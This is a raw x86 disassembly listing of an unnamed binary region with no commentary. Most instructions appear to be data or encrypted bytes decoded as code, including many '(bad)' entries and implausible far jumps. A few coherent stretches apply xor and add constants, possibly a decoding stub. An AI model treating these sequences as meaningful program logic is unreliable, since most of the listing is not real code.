  40cc69:	repz and eax,0x6e52af8d
  40cc6f:	mov    BYTE PTR [edx],bl
  40cc71:	leave  
  40cc72:	fdivr  QWORD PTR [ecx-0x41]
  40cc75:	add    edx,DWORD PTR [ecx-0x6b]
  40cc78:	dec    edx
  40cc79:	iret   
  40cc7a:	cmp    al,0x16
  40cc7c:	cwde   
  40cc7d:	sub    al,0x58
  40cc7f:	push   ebp
  40cc80:	aam    0xaf
  40cc82:	arpl   di,sp
  40cc84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc85:	pop    ss
  40cc86:	xor    al,0x6c
  40cc88:	jae    0x40ccba
  40cc8a:	sbb    ebx,edi
  40cc8c:	inc    edi
  40cc8d:	push   ebp
  40cc8e:	mov    bl,0x2d
  40cc91:	adc    al,0x7d
  40cc93:	add    ebp,DWORD PTR [esi+edi*2+0x31]
  40cc97:	push   eax
  40cc98:	mov    eax,ds:0x1c17b243
  40cc9d:	(bad)  
  40cc9e:	adc    eax,0x5cb181cf
  40cca3:	add    edi,DWORD PTR [ebp+0x2d]
  40cca6:	stos   DWORD PTR es:[edi],eax
  40cca7:	adc    BYTE PTR [ebx],dl
  40cca9:	adc    eax,0x9ae4a3fd
  40ccae:	pushf  
  40ccaf:	cmp    al,0xda
  40ccb1:	fbstp  TBYTE PTR [edx+ecx*4]
  40ccb4:	and    dl,BYTE PTR [ebx-0x12]
  40ccb7:	pop    ecx
  40ccb8:	fst    DWORD PTR [edx-0x1b]
  40ccbb:	mov    al,0x22
  40ccbd:	mov    edi,DWORD PTR ds:0x965e3b8d
  40ccc3:	xchg   esi,eax
  40ccc4:	xor    ch,BYTE PTR [ebx-0xac60a94]
  40ccca:	push   0xe939566b
  40cccf:	jnp    0x40cc7b
  40ccd1:	and    eax,0x11b7ab0e
  40ccd6:	adc    al,0x1d
  40ccd8:	or     al,0x40
  40ccda:	jg     0x40cce4
  40ccdc:	add    bl,cl
  40ccde:	fldl2e 
  40cce0:	js     0x40cc98
  40cce2:	xchg   ebp,eax
  40cce3:	add    al,BYTE PTR [eax-0x4]
  40cce6:	and    DWORD PTR [edx+0x33],edi
  40cce9:	lods   eax,DWORD PTR ds:[esi]
  40ccea:	inc    edi
  40cceb:	xor    bh,BYTE PTR [esp+edx*2+0x21]
  40ccef:	pop    eax
  40ccf0:	pop    edx
  40ccf1:	add    BYTE PTR [ebx+0x7b4a1b6],0x1d
  40ccf8:	jmp    0x51cc4816
  40ccfd:	sar    BYTE PTR ds:0x7b324d45,1
  40cd03:	ss cmp eax,0xced744ce
  40cd09:	add    al,0x4f
  40cd0b:	test   cl,ah
  40cd0d:	add    eax,0x4a537845
  40cd12:	push   edx
  40cd13:	adc    dh,BYTE PTR [ebp+0x32]
  40cd16:	ins    DWORD PTR es:[edi],dx
  40cd17:	pop    es
  40cd18:	and    eax,0x3dfb7371
  40cd1d:	sub    ah,BYTE PTR [edx-0x62]
  40cd20:	mov    edx,0x36f85119
  40cd25:	fld    DWORD PTR [edi-0x2689d597]
  40cd2b:	fsub   DWORD PTR [edi]
  40cd2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd2e:	adc    DWORD PTR [eax-0x16949490],esp
  40cd34:	sub    eax,DWORD PTR [edi+0x2bffc932]
  40cd3a:	push   es
  40cd3b:	lods   al,BYTE PTR ds:[esi]
  40cd3c:	jp     0x40ccd9
  40cd3e:	jp     0x40cd15
  40cd40:	test   al,0x64
  40cd42:	add    BYTE PTR [eax],bh
  40cd44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd45:	dec    esp
  40cd46:	add    al,0xcb
  40cd48:	cmp    edx,DWORD PTR [ebp-0x3b6017da]
  40cd4e:	mov    ch,0xa3
  40cd50:	jp     0x40cdc0
  40cd52:	jp     0x40cd6f
  40cd54:	pusha  
  40cd55:	push   esp
  40cd56:	in     eax,0x38
  40cd58:	add    eax,0x258bde40
  40cd5d:	rcl    DWORD PTR ds:0x20f8e5be,0xd4
  40cd64:	(bad)  
  40cd65:	jno    0x40cdd2
  40cd67:	mul    DWORD PTR [edi+edx*2+0x3a05740e]
  40cd6e:	xor    al,0xf3
  40cd70:	mov    cl,0x62
  40cd72:	(bad)  
  40cd73:	retf   0xee29
  40cd76:	xchg   BYTE PTR [ebx-0x4f8f2eea],bl
  40cd7c:	cmp    al,0xf9
  40cd7e:	stos   BYTE PTR es:[edi],al
  40cd7f:	cdq    
  40cd80:	in     eax,0x1e
  40cd82:	xchg   edi,edx
  40cd84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd85:	cmp    ebx,edx
  40cd87:	adc    DWORD PTR [eax-0x69],edx
  40cd8a:	pop    ss
  40cd8b:	mov    esp,DWORD PTR [ebp-0x53]
  40cd8e:	cdq    
  40cd8f:	in     al,dx
  40cd90:	arpl   WORD PTR [edx+ebx*4+0x5f21d3ce],dx
  40cd97:	and    DWORD PTR [edx+0x9],ebx
  40cd9a:	inc    eax
  40cd9b:	mov    ebp,0xc6c61fba
  40cda0:	and    eax,0x3e06313
  40cda5:	gs lahf 
  40cda7:	ins    BYTE PTR es:[edi],dx
  40cda8:	mov    BYTE PTR fs:[eax-0x55],cl
  40cdac:	lahf   
  40cdad:	jnp    0x40cdb6
  40cdaf:	nop
  40cdb0:	jnp    0x40cd62
  40cdb2:	stos   BYTE PTR es:[edi],al
  40cdb3:	xchg   DWORD PTR [edi],ebx
  40cdb5:	into   
  40cdb6:	out    0x83,al
  40cdb8:	and    edx,DWORD PTR [edi+0x72]
  40cdbb:	arpl   WORD PTR [eax+0x6b],si
  40cdbe:	outs   dx,DWORD PTR ds:[esi]
  40cdbf:	mov    al,BYTE PTR [eax+esi*8]
  40cdc2:	sbb    bh,dh
  40cdc4:	test   al,0x7e
  40cdc6:	adc    al,cl
  40cdc8:	adc    eax,0x1f88006d
  40cdcd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cdce:	and    bl,bh
  40cdd0:	xchg   ebp,eax
  40cdd1:	add    DWORD PTR [esi],ebp
  40cdd3:	cmp    al,0x2d
  40cdd5:	jmp    0x40ce24
  40cdd7:	adc    dh,dh
  40cdd9:	stos   BYTE PTR es:[edi],al
  40cdda:	add    eax,0x1f0eceb
  40cddf:	adc    bh,al
  40cde1:	aas    
  40cde2:	jecxz  0x40ce60
  40cde4:	ss pop edi
  40cde6:	call   0xe44e:0x717fe26c
  40cded:	test   al,0xf
  40cdef:	mov    ds:0x351bb968,eax
  40cdf4:	in     al,dx
  40cdf5:	jg     0x40cddd
  40cdf7:	je     0x40cd7d
  40cdf9:	xchg   ebp,eax
  40cdfa:	out    dx,eax
  40cdfb:	ret    0x87c9
  40cdfe:	add    esp,edx
  40ce00:	mov    ebx,DWORD PTR [ebp-0x564ffe28]
  40ce06:	push   ecx
  40ce07:	jbe    0x40ce26
  40ce09:	pushf  
  40ce0a:	mov    fs,WORD PTR [ebx+edx*4-0x3c537caf]
  40ce11:	mov    bh,0xa6
  40ce13:	outs   dx,DWORD PTR ds:[esi]
  40ce14:	mov    bh,BYTE PTR [ebp+0x2960e8c1]
  40ce1a:	cmp    esp,edx
  40ce1c:	hlt    
  40ce1d:	xchg   ebp,eax
  40ce1e:	jae    0x40ce89
  40ce20:	mov    DWORD PTR [ecx+0x2e562fb6],esp
  40ce26:	and    dl,dl
  40ce28:	mov    ah,0x18
  40ce2a:	jnp    0x40ce9b
  40ce2c:	sahf   
  40ce2d:	and    esp,esi
  40ce2f:	xor    DWORD PTR [eax+0x66],0xa308e993
  40ce36:	mov    ebp,0xaab387f1
  40ce3b:	xchg   edi,eax
  40ce3c:	xor    BYTE PTR [esp+eax*4],ch
  40ce3f:	in     eax,0xdf
  40ce41:	fnsetpm(287 only) 
  40ce43:	adc    eax,0xa71e2da4
  40ce48:	lahf   
  40ce49:	cmc    
  40ce4a:	xor    eax,eax
  40ce4c:	inc    eax
  40ce4d:	mov    esp,0x8f2e73d1
  40ce52:	das    
  40ce53:	sbb    bl,al
  40ce55:	xor    bh,BYTE PTR [edx+eax*4]
  40ce58:	xor    ch,dl
  40ce5a:	retf   
  40ce5b:	(bad)
  40ce5e:	jmp    0xa865:0xdae06706
  40ce65:	in     al,dx
  40ce66:	inc    edi
  40ce67:	add    ah,dl
  40ce69:	int3   
  40ce6a:	shl    BYTE PTR [eax+ebp*2+0x3702909d],0x70
  40ce72:	ror    BYTE PTR [ebx],0xa3
  40ce75:	int    0xb0
  40ce77:	scas   al,BYTE PTR es:[edi]
  40ce78:	inc    esp
  40ce79:	sbb    eax,0x3ec4017e
  40ce7e:	mul    BYTE PTR [edx+0x5a]
  40ce81:	mov    ah,0x34
  40ce83:	mov    ebp,0x28ea59d6
  40ce88:	(bad)  [edx]
  40ce8a:	ins    DWORD PTR es:[edi],dx
  40ce8b:	dec    esi
  40ce8c:	sub    ah,al
  40ce8e:	sahf   
  40ce8f:	iret   
  40ce90:	pop    ebx
  40ce91:	jb     0x40ced3
  40ce93:	scas   al,BYTE PTR es:[edi]
  40ce94:	call   0x7479:0x98ccc478
  40ce9b:	clc    
  40ce9c:	dec    edi
  40ce9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce9e:	dec    edx
  40ce9f:	or     esi,DWORD PTR [esi-0x62]
  40cea2:	lock cld 
  40cea4:	scas   al,BYTE PTR es:[edi]
  40cea5:	pop    ds
  40cea6:	mov    ebx,0x27fa6d0c
  40ceab:	fsub   st(0),st
  40cead:	push   edx
  40ceae:	ret    
  40ceaf:	mov    dh,0xaf
  40ceb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ceb2:	ds dec esp
  40ceb4:	pop    edi
  40ceb5:	jmp    0x40cead
  40ceb7:	aaa    
  40ceb8:	mov    dl,0xc7
  40ceba:	mov    cl,0x9a
  40cebc:	jnp    0x40cea1
  40cebe:	fidiv  DWORD PTR [edx+0x52]
  40cec1:	dec    eax
  40cec2:	mov    cl,BYTE PTR [edx+edi*2]
  40cec5:	cwde   
  40cec6:	push   ebx
  40cec7:	push   ebx
  40cec8:	jae    0x40ce83
  40ceca:	fiadd  WORD PTR [edi-0x6f]
  40cecd:	fsubr  st(6),st
  40cecf:	dec    edx
  40ced0:	retf   
  40ced1:	add    al,0x25
  40ced3:	or     edi,edi
  40ced5:	loop   0x40ce83
  40ced7:	inc    ebx
  40ced8:	retf   
  40ced9:	in     eax,dx
  40ceda:	push   ds
  40cedb:	shr    BYTE PTR [esi],0x5b
  40cede:	add    esi,ebx
  40cee0:	and    bl,BYTE PTR [edx]
  40cee2:	xor    BYTE PTR [ebp+eax*4+0xc28dc88],ch
  40cee9:	dec    ebx
  40ceea:	clc    
  40ceeb:	sbb    esp,edi
  40ceed:	aas    
  40ceee:	test   BYTE PTR [ebp+0x3f87b15f],al
  40cef4:	shl    DWORD PTR [edx+0x60],cl
  40cef7:	lods   eax,DWORD PTR ds:[esi]
  40cef8:	mov    cl,0x3f
  40cefa:	dec    BYTE PTR [ebp+ebp*1+0x6cc4df00]
  40cf01:	mov    ch,0xa9
  40cf03:	mov    esp,0x5edb4743
  40cf08:	mov    ebp,0x377f30db
  40cf0d:	das    
  40cf0e:	aas    
  40cf0f:	repnz xchg edx,eax
  40cf11:	dec    ecx
  40cf12:	or     BYTE PTR [eax-0x64edc34b],ah
  40cf18:	rcl    DWORD PTR gs:[ecx],1
  40cf1b:	pusha  
  40cf1c:	jns    0x40cf89
  40cf1e:	mov    ?,WORD PTR [ebp+0xef81dae]
  40cf24:	scas   al,BYTE PTR es:[edi]
  40cf25:	jns    0x40cf60
  40cf27:	mov    bh,0xfb
  40cf29:	(bad)  [ebx+0x22e3670d]
  40cf2f:	in     eax,dx
  40cf30:	jge    0x40cfa2
  40cf32:	arpl   WORD PTR ds:0x73e55bb3,bx
  40cf38:	out    0x68,eax
  40cf3a:	cmp    ch,BYTE PTR [eax-0x242b5f41]
  40cf40:	or     ch,dl
  40cf42:	pusha  
  40cf43:	mov    cl,0x75
  40cf45:	mov    WORD PTR [edi],ds
  40cf47:	cmp    eax,0xa2cdd6a2
  40cf4c:	cli    
  40cf4d:	std    
  40cf4e:	loop   0x40cf39
  40cf50:	sti    
  40cf51:	mov    eax,DWORD PTR [ebp+0xc]
  40cf54:	add    eax,DWORD PTR [ebp+0x8]
  40cf57:	mov    DWORD PTR [ebp-0x10],eax
  40cf5a:	mov    eax,DWORD PTR [ebp-0x1c]
  40cf5d:	test   eax,eax
  40cf5f:	je     0x40dfcf
  40cf65:	mov    DWORD PTR [ebp-0x24],esi
  40cf68:	push   0xb
  40cf6a:	pop    ecx
  40cf6b:	push   0x5
  40cf6d:	dec    ecx
  40cf6e:	jmp    0x40d28e
  40cf73:	test   DWORD PTR [ebx],ebx
  40cf75:	jnp    0x40cfa2
  40cf77:	mov    eax,ds:0x98b1b52b
  40cf7c:	xchg   ecx,eax
  40cf7d:	rcr    dl,0x6f
  40cf80:	adc    al,0x16
  40cf82:	shl    DWORD PTR [ecx],1
  40cf84:	xchg   esi,eax
  40cf85:	jle    0x40d005
  40cf87:	jge    0x40d006
  40cf89:	jle    0x40d009
  40cf8b:	jae    0x40cff7
  40cf8d:	shl    BYTE PTR [edx+ebp*2+0x4e5019f9],cl
  40cf94:	arpl   WORD PTR [ebp-0x4c],ax
  40cf97:	arpl   WORD PTR [edx],cx
  40cf99:	add    dh,BYTE PTR [ebp+ebx*1+0x72]
  40cf9d:	adc    BYTE PTR ds:0x37fc5983,dh
  40cfa3:	adc    dl,BYTE PTR [ecx]
  40cfa5:	jle    0x40cfe1
  40cfa7:	sbb    eax,0xe02eec7c
  40cfac:	outs   dx,DWORD PTR ds:[esi]
  40cfad:	clc    
  40cfae:	or     al,0xcb
  40cfb0:	repz or DWORD PTR [edi],esi
  40cfb3:	mov    esi,0x6b597c0f
  40cfb8:	das    
  40cfb9:	sub    eax,0xf0e59af6
  40cfbe:	mov    ds:0xa7355520,al
  40cfc3:	xor    eax,DWORD PTR [edx+0x39]
  40cfc6:	loope  0x40d026
  40cfc8:	dec    ebp
  40cfc9:	mov    ecx,0xbd6d123c
  40cfce:	scas   al,BYTE PTR es:[edi]
  40cfcf:	pop    ecx
  40cfd0:	cmp    al,0x42
  40cfd2:	sbb    eax,0x1f8226be
  40cfd7:	and    BYTE PTR [ebx+0x68155360],bl
  40cfdd:	pop    esi
  40cfde:	xor    al,0x42
  40cfe0:	jl     0x40d028
  40cfe2:	mov    edi,0xe6e873d2
  40cfe7:	into   
  40cfe8:	mov    cl,0xd8
  40cfeb:	imul   edx,DWORD PTR [eax],0xffffff84
  40cfee:	sbb    edi,edx
  40cff0:	dec    edx
  40cff1:	imul   ecx,ebp,0xffffffc5
  40cff4:	test   DWORD PTR [esi-0x25fe5375],esi
  40cffa:	pusha  
  40cffb:	das    
  40cffc:	or     eax,0x62fdfa4a
  40d001:	fcom   QWORD PTR [eax+0x39]
  40d004:	pop    es
  40d005:	loopne 0x40d05b
  40d007:	adc    ecx,DWORD PTR [esi-0x65]
  40d00a:	in     al,dx
  40d00b:	cmp    cl,bh
  40d00d:	mov    ch,0x1f
  40d00f:	mov    ds:0x70ed02d7,eax
  40d014:	mov    bl,0xae
  40d016:	repz and al,0xfc
  40d019:	cmp    edi,DWORD PTR [edi-0x76]
  40d01c:	jecxz  0x40d01e
  40d01e:	in     eax,0x25
  40d020:	fwait
  40d021:	sub    al,0x43
  40d023:	sub    edx,edi
  40d025:	push   ds
  40d026:	test   esi,0x951befa6
  40d02c:	jecxz  0x40cfe0
  40d02e:	dec    ebx
  40d02f:	xor    bl,dl
  40d031:	mov    al,0x8
  40d033:	retf   0x27fe
  40d036:	adc    eax,0x38e59783
  40d03b:	pushf  
  40d03c:	jmp    0xbf71bc65
  40d041:	push   esp
  40d042:	jbe    0x40cff6
  40d044:	dec    edx
  40d045:	jecxz  0x40d0b4
  40d047:	add    edi,DWORD PTR [ebx-0x58]
  40d04a:	cmp    al,BYTE PTR [eax+0x48]
  40d04d:	jo     0x40cfe0
  40d04f:	cld    
  40d050:	daa    
  40d051:	mov    DWORD PTR [ebp-0x54724ffb],0xcb79a6db
  40d05b:	xor    al,BYTE PTR [edx]
  40d05d:	adc    DWORD PTR [edx],edx
  40d05f:	push   esp
  40d060:	pop    eax
  40d061:	inc    eax
  40d062:	loopne 0x40d087
  40d064:	adc    bh,BYTE PTR [ebx]
  40d066:	mov    ds,WORD PTR [ebx-0x45b99450]
  40d06c:	call   0x7801:0x30ada8d1
  40d073:	cmp    ebx,DWORD PTR [ebp+0x36f3aad6]
  40d079:	test   al,0xf7
  40d07b:	gs daa 
  40d07d:	mov    ch,0x64
  40d07f:	cmp    al,0x39
  40d081:	aam    0xc8
  40d083:	cdq    
  40d084:	ror    ebp,0x6e
  40d087:	retf   0xd573
  40d08a:	push   ebx
  40d08b:	inc    ebx
  40d08c:	test   al,0xc8
  40d08e:	clc    
  40d08f:	rcr    DWORD PTR [edi+0x2b83559c],1
  40d095:	push   esp
  40d096:	pusha  
  40d097:	adc    DWORD PTR [ebx+0xd],esi
  40d09a:	arpl   WORD PTR [eax],ax
  40d09c:	jl     0xacb1eda4
  40d0a2:	retf   
  40d0a3:	inc    edx
  40d0a4:	mov    cl,0xa4
  40d0a6:	popa   
  40d0a7:	cwde   
  40d0a8:	fistp  QWORD PTR [edi+eax*8-0xf]
  40d0ac:	imul   esp,DWORD PTR [eax+eiz*8+0x67],0xc8e51e11
  40d0b4:	fdiv   QWORD PTR [edx+0x4d]
  40d0b7:	inc    eax
  40d0b8:	jno    0x40d0c0
  40d0ba:	addr16 es (bad) 
  40d0bd:	outs   dx,BYTE PTR ds:[esi]
  40d0be:	push   esi
  40d0bf:	out    dx,eax
  40d0c0:	ins    DWORD PTR es:[edi],dx
  40d0c1:	(bad)  
  40d0c2:	mov    esp,0x660119df
  40d0c7:	(bad)  
  40d0c8:	test   bh,al
  40d0ca:	mov    edi,0x2a455459
  40d0cf:	cmp    ah,BYTE PTR [eax-0x76]
  40d0d2:	jg     0x40d07e
  40d0d4:	pop    ebp
  40d0d5:	int3   
  40d0d6:	or     ecx,DWORD PTR [edi+0x40d5af63]
  40d0dc:	inc    edi
  40d0dd:	fcompp 
  40d0df:	imul   ah
  40d0e1:	(bad)  
  40d0e2:	adc    al,0x7
  40d0e4:	push   ebp
  40d0e5:	jle    0x40d119
  40d0e7:	repz sub ecx,0xd0fd234f
  40d0ee:	out    dx,al
  40d0ef:	xor    al,0x52
  40d0f1:	stc    
  40d0f2:	das    
  40d0f3:	lods   al,BYTE PTR ds:[esi]
  40d0f4:	sub    BYTE PTR [edx-0x4c],0xb8
  40d0f8:	movnti DWORD PTR [edx-0x358d3cb1],esi
  40d0ff:	inc    ebp
  40d100:	sub    dl,BYTE PTR [ebx-0xbd2a952]
  40d106:	js     0x40d0de
  40d108:	sti    
  40d109:	mov    al,0x76
  40d10b:	lock mov bl,0x92
  40d10e:	push   ebp
  40d10f:	test   eax,0x88ddea2
  40d114:	lea    edx,[ecx]
  40d116:	arpl   WORD PTR [ebx+0x4fe08a27],di
  40d11c:	xchg   bl,al
  40d11e:	sbb    BYTE PTR [ecx-0x39],bh
  40d121:	xor    DWORD PTR [edi-0x7e09babd],esi
  40d127:	lea    edx,[edi+0x47]
  40d12a:	mov    dh,0x90
  40d12c:	mov    eax,ds:0xcad3a305
  40d131:	pop    esi
  40d132:	add    eax,0xefb9c2cf
  40d137:	or     ebp,DWORD PTR [ecx]
  40d139:	out    dx,al
  40d13a:	sahf   
  40d13b:	push   ds
  40d13c:	(bad)
  40d13f:	aaa    
  40d140:	add    BYTE PTR [edx+0x6c33d7ba],0x6b
  40d147:	sub    al,0x61
  40d149:	stos   BYTE PTR es:[edi],al
  40d14a:	xchg   ecx,eax
  40d14b:	add    eax,0xc509c4d3
  40d150:	fidivr DWORD PTR [edx-0x22]
  40d153:	jbe    0x40d0ec
  40d155:	push   DWORD PTR [bp+0x6c]
  40d159:	stos   BYTE PTR es:[edi],al
  40d15a:	dec    eax
  40d15b:	or     DWORD PTR [edx-0x5cd8449],esi
  40d161:	dec    esi
  40d162:	lea    ecx,[esi+0x6f]
  40d165:	ret    0x3c00
  40d168:	inc    ebx
  40d169:	ffreep st(7)
  40d16b:	mov    dl,0x8
  40d16d:	sbb    bh,BYTE PTR [ebx-0x58]
  40d170:	cdq    
  40d171:	mov    bl,0xa6
  40d173:	aam    0xe2
  40d175:	arpl   WORD PTR [esi-0x8],cx
  40d178:	(bad)  [edx+eax*8+0x7c]
  40d17c:	push   esi
  40d17d:	adc    al,0xfd
  40d17f:	push   eax
  40d180:	cmp    DWORD PTR [eax-0x41],ebx
  40d183:	neg    edx
  40d185:	data16 ficom WORD PTR [ebx-0x58]
  40d189:	aad    0x31
  40d18b:	loope  0x40d1aa
  40d18d:	jmp    0x21d4604d
  40d192:	imul   DWORD PTR [eax-0x1b]
  40d195:	out    0x52,al
  40d197:	std    
  40d198:	aad    0xec
  40d19a:	fwait
  40d19b:	stc    
  40d19c:	test   DWORD PTR [ecx],edx
  40d19e:	xor    BYTE PTR ds:0x8e4fbfa8,ch
  40d1a4:	push   esp
  40d1a5:	jae    0x40d180
  40d1a7:	out    0xc0,al
  40d1a9:	jl     0x40d1c9
  40d1ab:	mov    eax,0x4823e772
  40d1b0:	sti    
  40d1b1:	dec    esp
  40d1b2:	sub    al,0xf6
  40d1b4:	xchg   edi,eax
  40d1b5:	iret   
  40d1b6:	jmp    0xef6f:0x8808dac1
  40d1bd:	loope  0x40d14f
  40d1bf:	cmp    dl,BYTE PTR [ebx-0x3947c9d2]
  40d1c5:	adc    eax,0x50d3e4f0
  40d1ca:	and    ah,BYTE PTR [ebx+0x22]
  40d1cd:	push   edx
  40d1ce:	lahf   
  40d1cf:	jg     0x40d1a8
  40d1d1:	inc    eax
  40d1d2:	pop    es
  40d1d3:	out    0x22,al
  40d1d5:	dec    ebp
  40d1d6:	pop    edi
  40d1d7:	jecxz  0x40d20f
  40d1d9:	mov    esp,0x6a6751cd
  40d1de:	sub    ch,BYTE PTR [edi+0x4083d4c2]
  40d1e4:	push   eax
  40d1e5:	cwde   
  40d1e6:	mov    edx,0xcd1bd150
  40d1eb:	xor    BYTE PTR [edx+0x15],0x2c
  40d1ef:	sub    ah,ch
  40d1f1:	inc    ecx
  40d1f2:	xor    eax,0x9960ebbe
  40d1f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d1f8:	mov    esi,edi
  40d1fa:	adc    BYTE PTR [edi-0x7c],0x81
  40d1fe:	popf   
  40d1ff:	push   edx
  40d200:	std    
  40d201:	add    DWORD PTR [ebp+0x2eec5746],0x5468282c
  40d20b:	(bad)  
  40d20c:	lahf   
  40d20d:	jb     0x40d1bb
  40d20f:	cmp    BYTE PTR ss:[edx-0x1720dba5],dh
  40d216:	cld    
  40d217:	in     al,dx
  40d218:	xor    DWORD PTR [eax],eax
  40d21a:	loop   0x40d237
  40d21c:	in     eax,0xea
  40d21e:	(bad)  
  40d220:	xchg   ebx,eax
  40d221:	xchg   ebp,eax
  40d222:	mov    ds:0x90658fb8,al
  40d227:	test   eax,0x36e1b42f
  40d22c:	lahf   
  40d22d:	sub    DWORD PTR ds:[ecx-0x2f],esi
  40d231:	adc    BYTE PTR [ebp-0x7c],dh
  40d234:	lock in al,dx
  40d236:	cmp    ch,bl
  40d238:	xlat   BYTE PTR ds:[ebx]
  40d239:	jnp    0x40d278
  40d23b:	fsubr  QWORD PTR [esi]
  40d23d:	shl    edx,1
  40d23f:	adc    eax,ecx
  40d241:	push   edx
  40d242:	in     eax,0x66
  40d244:	cmp    al,0x1c
  40d246:	int3   
  40d247:	jnp    0x40d235
  40d249:	cmp    esi,DWORD PTR [ecx-0x7769fd94]
  40d24f:	daa    
  40d250:	push   ecx
  40d251:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d252:	aas    
  40d253:	dec    ebp
  40d254:	jb     0x40d2be
  40d256:	jle    0x40d24c
  40d258:	pop    ebp
  40d259:	xor    ecx,DWORD PTR [eax+0x23]
  40d25c:	les    esi,FWORD PTR [edx+eax*1+0x1b]
  40d260:	mov    esp,0x4b4817dd
  40d265:	pop    ebx
  40d266:	add    eax,DWORD PTR [ecx+edx*4-0x2c08130d]
  40d26d:	pop    esp
  40d26e:	outs   dx,DWORD PTR ds:[esi]
  40d26f:	das    
  40d270:	js     0x40d2e5
  40d272:	test   DWORD PTR [eax],ecx
  40d274:	aaa    
  40d275:	mov    esi,0x394f735
  40d27a:	pop    edx
  40d27b:	push   ss
  40d27c:	push   0x36
  40d27e:	arpl   di,cx
  40d280:	shl    ah,0x4d
  40d283:	test   bl,0x1
  40d286:	mov    esp,0x6b168482
  40d28b:	mov    al,0xa6
  40d28d:	sub    bl,BYTE PTR [ebx-0x79]
  40d290:	retf   
  40d291:	sub    ebx,ecx
  40d293:	xchg   ebx,ecx
  40d295:	dec    ecx
  40d296:	mov    eax,DWORD PTR [ebp-0x1c]
  40d299:	imul   eax,ecx
  40d29c:	sub    esp,eax
  40d29e:	mov    DWORD PTR [ebp-0x24],esp
  40d2a1:	mov    eax,DWORD PTR [ebp-0x4]
  40d2a4:	mov    ecx,0x7510854
  40d2a9:	xor    eax,ecx
  40d2ab:	mov    edx,0x32729b
  40d2b0:	add    eax,edx
  40d2b2:	mov    DWORD PTR [ebp+0x8],eax
  40d2b5:	mov    eax,DWORD PTR [ebp-0x18]
  40d2b8:	xor    eax,ecx
  40d2ba:	add    eax,edx
  40d2bc:	mov    edx,DWORD PTR [ebp+0x14]
  40d2bf:	jmp    0x40d5df
  40d2c4:	xor    ch,cl
  40d2c6:	xor    DWORD PTR [ecx+0x69b241f1],eax
  40d2cc:	xor    esi,ebx
  40d2ce:	pop    ecx
  40d2d0:	mov    eax,ds:0x2ce5983f
  40d2d5:	xchg   ebp,eax
  40d2d6:	jle    0x40d356
  40d2d8:	jge    0x40d357
  40d2da:	jle    0x40d35a
  40d2dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d2dd:	jnp    0x40d267
  40d2df:	pop    es
  40d2e0:	inc    eax
  40d2e1:	add    esp,ebp
  40d2e3:	arpl   sp,bp
  40d2e5:	add    eax,DWORD PTR [bp+0x51]
  40d2e9:	jae    0x40d281
  40d2eb:	imul   ecx,DWORD PTR [edi+0x4bf0c32],0x195edb59
  40d2f5:	popf   
  40d2f6:	ret    
  40d2f7:	xor    BYTE PTR [ecx+0x26c00609],dh
  40d2fd:	mov    dl,0x6f
  40d2ff:	inc    edi
  40d300:	daa    
  40d301:	sbb    edi,edx
  40d303:	leave  
  40d304:	icebp  
  40d305:	test   al,0xc5
  40d307:	and    BYTE PTR [edx-0x61694ff3],cl
  40d30d:	and    DWORD PTR [edx],ebp
  40d30f:	jae    0x40d293
  40d311:	imul   esi,edx,0x47
  40d314:	in     eax,dx
  40d315:	lods   al,BYTE PTR ds:[esi]
  40d316:	inc    ecx
  40d317:	add    eax,0x6bb4ac82
  40d31c:	jbe    0x40d31b
  40d31e:	cwde   
  40d31f:	add    al,0xa6
  40d321:	jb     0x40d35c
  40d323:	mov    dh,BYTE PTR ds:[eax]
  40d326:	ja     0x40d2c2
  40d328:	xor    esi,eax
  40d32a:	xor    al,0x20
  40d32c:	add    al,0x88
  40d32e:	test   DWORD PTR [ebp+esi*1-0x16],edx
  40d332:	lods   al,BYTE PTR ds:[esi]
  40d333:	mov    esi,0xdd2549d7
  40d338:	cwde   
  40d339:	in     al,0x52
  40d33b:	pop    esp
  40d33c:	scas   eax,DWORD PTR es:[edi]
  40d33d:	dec    ebx
  40d33e:	and    al,0xae
  40d340:	mov    eax,DWORD PTR [esi-0x9]
  40d343:	pop    ecx
  40d344:	cmp    DWORD PTR [ecx],esi
  40d346:	test   eax,0xeccfdcb6
  40d34b:	push   esp
  40d34c:	lods   eax,DWORD PTR ds:[esi]
  40d34d:	imul   ebp,DWORD PTR ds:0x6fb36034,0xffffff8b
  40d354:	les    ebx,FWORD PTR [esi+0x2dbd1ed]
  40d35a:	(bad)
  40d35e:	fistp  WORD PTR [edi+0x3f]
  40d361:	cwde   
  40d362:	fwait
  40d363:	mov    edx,0x5730105b
  40d368:	lock jmp 0x40d34b
  40d36b:	call   DWORD PTR [ecx]
  40d36d:	adc    DWORD PTR [eax-0x1c496d0c],ebp
  40d373:	in     eax,dx
  40d374:	je     0x40d3af
  40d376:	ja     0x40d3e1
  40d378:	rol    BYTE PTR [ecx+ebx*4-0x3d9809a6],1
  40d37f:	out    0xb9,al
  40d381:	popf   
  40d382:	mov    al,bh
  40d384:	xchg   ebx,ebp
  40d386:	fistp  WORD PTR [ebx+0x43]
  40d389:	in     eax,0xb6
  40d38b:	xchg   edi,eax
  40d38c:	xor    BYTE PTR ds:[esi-0x65],dl
  40d390:	push   es
  40d391:	pop    esi
  40d392:	pop    esp
  40d393:	cs push esp
  40d395:	inc    esi
  40d396:	dec    edx
  40d397:	or     DWORD PTR [edi+0x35ec866],esi
  40d39d:	and    al,0x47
  40d39f:	mov    ebx,ss
  40d3a1:	push   0x2e
  40d3a3:	cmp    edi,eax
  40d3a5:	xchg   ebx,eax
  40d3a6:	pop    ebx
  40d3a7:	(bad)  
  40d3a8:	cli    
  40d3a9:	in     eax,0x23
  40d3ab:	data16 xor al,0x4e
  40d3ae:	test   edx,ebx
  40d3b0:	xchg   BYTE PTR [edi],dl
  40d3b2:	repz xor BYTE PTR ds:[edx],bl
  40d3b6:	mov    bl,0x40
  40d3b8:	data16 ds sahf 
  40d3bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d3bc:	fwait
  40d3bd:	push   eax
  40d3be:	pop    ds
